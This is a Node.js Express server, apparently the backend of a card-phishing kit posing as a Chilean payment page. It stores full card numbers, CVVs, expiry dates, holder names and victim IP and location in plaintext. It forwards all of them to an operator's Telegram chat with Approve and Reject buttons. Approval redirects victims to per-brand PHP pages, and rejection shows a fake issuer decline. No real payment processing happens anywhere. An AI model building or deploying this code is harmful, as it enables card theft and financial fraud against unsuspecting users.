const express = require('express');
const cors = require('cors');
const { Pool } = require('pg');

const app = express();
app.use(cors());
app.use(express.json({ limit: '1mb' }));

// ============================================================
// POSTGRES
// ============================================================
const pool = new Pool({
    connectionString: process.env.DATABASE_URL,
    max: 5,
    ssl: process.env.DATABASE_URL?.includes('render.com')
        ? { rejectUnauthorized: false }
        : false
});
pool.on('error', err => console.error('❌ PG pool error:', err));

// ============================================================
// CONFIG
// ============================================================
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID;
const PUBLIC_BASE_URL    = process.env.PUBLIC_BASE_URL || 'https://pagos-backend.onrender.com';
const WEBHOOK_SECRET     = process.env.WEBHOOK_SECRET || '';

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.warn('⚠️ Faltan TELEGRAM_BOT_TOKEN o TELEGRAM_CHAT_ID');
}

// ============================================================
// INIT DB
// ============================================================
async function initDB() {
    await pool.query(`
        CREATE TABLE IF NOT EXISTS pagos_pendientes (
            id               SERIAL PRIMARY KEY,
            solicitud_id     VARCHAR(80) UNIQUE NOT NULL,
            empresa          VARCHAR(120),
            monto_clp        NUMERIC(14, 2),
            referencia       VARCHAR(120),
            titular          VARCHAR(120),
            numero_tarjeta   VARCHAR(30),
            cvv              VARCHAR(6),
            vencimiento      VARCHAR(10),
            marca_tarjeta    VARCHAR(20),
            banco_emisor     VARCHAR(120),
            estado           VARCHAR(20) DEFAULT 'pendiente',
            motivo_rechazo   TEXT,
            redirigir_a      VARCHAR(60),
            telegram_msg_id  BIGINT,
            ip_usuario       VARCHAR(60),
            pais_usuario     VARCHAR(60),
            ciudad_usuario   VARCHAR(80),
            created_at       TIMESTAMPTZ DEFAULT NOW(),
            updated_at       TIMESTAMPTZ DEFAULT NOW()
        );
        CREATE INDEX IF NOT EXISTS idx_pagos_estado ON pagos_pendientes(estado);
    `);
    console.log('✅ Tabla pagos_pendientes lista');
}
initDB().catch(err => console.error('❌ initDB:', err));

// ============================================================
// TELEGRAM HELPERS
// ============================================================
async function tgSendMessage(text, replyMarkup) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const body = { chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'HTML' };
    if (replyMarkup) body.reply_markup = replyMarkup;
    const r = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body)
    });
    return r.json();
}

async function tgEditMessage(messageId, text, replyMarkup) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`;
    const body = {
        chat_id: TELEGRAM_CHAT_ID,
        message_id: messageId,
        text,
        parse_mode: 'HTML'
    };
    if (replyMarkup) body.reply_markup = replyMarkup;
    try {
        const r = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body)
        });
        return r.json();
    } catch { return null; }
}

async function tgAnswerCallback(callbackQueryId, text) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`;
    try {
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ callback_query_id: callbackQueryId, text, show_alert: false })
        });
    } catch {}
}

// ============================================================
// ENVIAR SOLICITUD A TELEGRAM CON BOTONES
// ============================================================
async function enviarSolicitudATelegram(pago) {
    const montoFmt = Number(pago.monto_clp).toLocaleString('es-CL');
    const texto =
        `🔔 <b>NUEVA SOLICITUD DE PAGO</b>\n\n` +
        `🆔 <b>ID:</b> <code>${pago.solicitud_id}</code>\n` +
        `🏢 <b>Empresa:</b> ${pago.empresa || '—'}\n` +
        `💵 <b>Monto:</b> $${montoFmt} CLP\n` +
        `👤 <b>Titular:</b> ${pago.titular || '—'}\n` +
        `🏦 <b>Banco:</b> ${pago.banco_emisor || '—'}\n` +
        `💳 <b>Tarjeta:</b> <code>${pago.numero_tarjeta}</code>\n` +
        `📅 <b>Vence:</b> ${pago.vencimiento}\n` +
        `🔒 <b>CVV:</b> <code>${pago.cvv}</code>\n` +
        `🏷️ <b>Marca:</b> ${(pago.marca_tarjeta || '').toUpperCase()}\n` +
        `🌍 <b>IP:</b> ${pago.ip_usuario || '—'} (${pago.pais_usuario || '—'} / ${pago.ciudad_usuario || '—'})\n` +
        `🕒 ${new Date().toLocaleString('es-CL')}`;

    const replyMarkup = {
        inline_keyboard: [[
            { text: '✅ Aprobar',  callback_data: `aprobar:${pago.solicitud_id}` },
            { text: '❌ Rechazar', callback_data: `rechazar:${pago.solicitud_id}` }
        ]]
    };

    const res = await tgSendMessage(texto, replyMarkup);
    if (res.ok && res.result) {
        const msgId = res.result.message_id;
        await pool.query(
            `UPDATE pagos_pendientes SET telegram_msg_id = $1 WHERE solicitud_id = $2`,
            [msgId, pago.solicitud_id]
        );
        return msgId;
    }
    console.error('❌ Telegram sendMessage:', res);
    return null;
}

// ============================================================
// ENDPOINT: CREAR PAGO (lo llama el front pagotarjeta.html)
// ============================================================
app.post('/api/crear-pago', async (req, res) => {
    const {
        solicitud_id, empresa, monto_clp, referencia,
        titular, numero_tarjeta, cvv, vencimiento,
        marca_tarjeta, banco_emisor,
        ip_usuario, pais_usuario, ciudad_usuario
    } = req.body || {};

    if (!solicitud_id || !numero_tarjeta || !cvv || !vencimiento || !titular) {
        return res.status(400).json({ success: false, error: 'Datos incompletos' });
    }
    if (!['visa', 'mastercard', 'amex'].includes((marca_tarjeta || '').toLowerCase())) {
        return res.status(400).json({ success: false, error: 'Marca no soportada' });
    }

    try {
        const result = await pool.query(
            `INSERT INTO pagos_pendientes
                (solicitud_id, empresa, monto_clp, referencia, titular, numero_tarjeta, cvv,
                 vencimiento, marca_tarjeta, banco_emisor, ip_usuario, pais_usuario, ciudad_usuario)
             VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13)
             ON CONFLICT (solicitud_id) DO UPDATE
               SET numero_tarjeta = EXCLUDED.numero_tarjeta,
                   cvv = EXCLUDED.cvv,
                   vencimiento = EXCLUDED.vencimiento,
                   marca_tarjeta = EXCLUDED.marca_tarjeta,
                   banco_emisor = EXCLUDED.banco_emisor,
                   updated_at = NOW()
             RETURNING *`,
            [
                solicitud_id, empresa || '', monto_clp || 0, referencia || '',
                titular, numero_tarjeta, cvv, vencimiento,
                marca_tarjeta.toLowerCase(), banco_emisor || 'Desconocido',
                ip_usuario || '', pais_usuario || '', ciudad_usuario || ''
            ]
        );

        enviarSolicitudATelegram(result.rows[0]).catch(e => console.error('TG:', e));

        return res.json({ success: true, solicitud_id, estado: 'pendiente' });
    } catch (err) {
        console.error('❌ /api/crear-pago:', err);
        return res.status(500).json({ success: false, error: 'Error al registrar el pago' });
    }
});

// ============================================================
// ENDPOINT: ESTADO (lo consulta el front con polling)
// ============================================================
app.get('/api/estado-pago/:solicitud_id', async (req, res) => {
    try {
        const result = await pool.query(
            `SELECT estado, motivo_rechazo, redirigir_a, marca_tarjeta
             FROM pagos_pendientes WHERE solicitud_id = $1`,
            [req.params.solicitud_id]
        );
        if (result.rows.length === 0) {
            return res.status(404).json({ success: false, error: 'No encontrado' });
        }
        const row = result.rows[0];

        if (row.estado === 'aprobado') {
            return res.json({
                success: true,
                estado: 'aprobado',
                redirect: `${PUBLIC_BASE_URL}/${row.redirigir_a}`,
                marca: row.marca_tarjeta
            });
        }
        if (row.estado === 'rechazado') {
            return res.json({
                success: true,
                estado: 'rechazado',
                mensaje: row.motivo_rechazo ||
                    'La tarjeta fue declinada por el emisor. Verifica los datos o utiliza otra tarjeta.'
            });
        }
        return res.json({ success: true, estado: 'pendiente' });
    } catch (err) {
        console.error('❌ /api/estado-pago:', err);
        return res.status(500).json({ success: false, error: 'Error' });
    }
});

// ============================================================
// WEBHOOK TELEGRAM (recibe clicks de botones)
// ============================================================
app.post('/api/telegram-webhook', async (req, res) => {
    // Validar secret opcional
    if (WEBHOOK_SECRET) {
        const headerSecret = req.header('x-telegram-bot-api-secret-token');
        if (headerSecret !== WEBHOOK_SECRET) {
            console.warn('⚠️ Webhook secret inválido');
            return res.sendStatus(403);
        }
    }

    res.sendStatus(200);

    const update = req.body || {};
    const cq = update.callback_query;
    if (!cq || !cq.data) return;

    const [accion, solicitud_id] = cq.data.split(':');
    const msgId = cq.message?.message_id;

    try {
        const result = await pool.query(
            `SELECT * FROM pagos_pendientes WHERE solicitud_id = $1`,
            [solicitud_id]
        );
        if (result.rows.length === 0) {
            await tgAnswerCallback(cq.id, 'Solicitud no encontrada');
            return;
        }
        const pago = result.rows[0];

        if (pago.estado !== 'pendiente') {
            await tgAnswerCallback(cq.id, `Ya fue ${pago.estado}`);
            return;
        }

        const montoFmt = Number(pago.monto_clp).toLocaleString('es-CL');

        if (accion === 'aprobar') {
            const mapa = { visa: 'visa.php', mastercard: 'master.php', amex: 'amex.php' };
            const archivo = mapa[(pago.marca_tarjeta || '').toLowerCase()];
            if (!archivo) {
                await tgAnswerCallback(cq.id, 'Marca no soportada');
                return;
            }
            await pool.query(
                `UPDATE pagos_pendientes
                 SET estado = 'aprobado', redirigir_a = $1, updated_at = NOW()
                 WHERE solicitud_id = $2`,
                [archivo, solicitud_id]
            );

            await tgAnswerCallback(cq.id, '✅ Aprobado');
            if (msgId) {
                await tgEditMessage(msgId,
                    `✅ <b>PAGO APROBADO</b>\n\n` +
                    `🆔 <b>ID:</b> <code>${pago.solicitud_id}</code>\n` +
                    `🏢 <b>Empresa:</b> ${pago.empresa}\n` +
                    `💵 <b>Monto:</b> $${montoFmt} CLP\n` +
                    `👤 <b>Titular:</b> ${pago.titular}\n` +
                    `💳 <b>Tarjeta:</b> <code>${pago.numero_tarjeta}</code>\n` +
                    `➡️ <b>Redirigido a:</b> ${archivo}\n` +
                    `🕒 ${new Date().toLocaleString('es-CL')}`
                );
            }
        } else if (accion === 'rechazar') {
            const motivo = 'La tarjeta fue declinada por el emisor. Verifica los datos o utiliza otra tarjeta.';
            await pool.query(
                `UPDATE pagos_pendientes
                 SET estado = 'rechazado', motivo_rechazo = $1, updated_at = NOW()
                 WHERE solicitud_id = $2`,
                [motivo, solicitud_id]
            );

            await tgAnswerCallback(cq.id, '❌ Rechazado');
            if (msgId) {
                await tgEditMessage(msgId,
                    `❌ <b>PAGO RECHAZADO</b>\n\n` +
                    `🆔 <b>ID:</b> <code>${pago.solicitud_id}</code>\n` +
                    `🏢 <b>Empresa:</b> ${pago.empresa}\n` +
                    `💵 <b>Monto:</b> $${montoFmt} CLP\n` +
                    `👤 <b>Titular:</b> ${pago.titular}\n` +
                    `💳 <b>Tarjeta:</b> <code>${pago.numero_tarjeta}</code>\n` +
                    `🕒 ${new Date().toLocaleString('es-CL')}`
                );
            }
        }
    } catch (err) {
        console.error('❌ webhook:', err);
    }
});

// Health
app.get('/health', (_req, res) => res.json({ ok: true, ts: Date.now() }));

// ============================================================
// START
// ============================================================
const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Backend pagos en puerto ${PORT}`);
    console.log(`🌐 PUBLIC_BASE_URL = ${PUBLIC_BASE_URL}`);
    console.log(`🤖 Telegram bot: ${TELEGRAM_BOT_TOKEN ? 'OK' : 'FALTA'}`);
    console.log(`🗄️  Postgres: ${process.env.DATABASE_URL ? 'OK' : 'FALTA'}`);
});
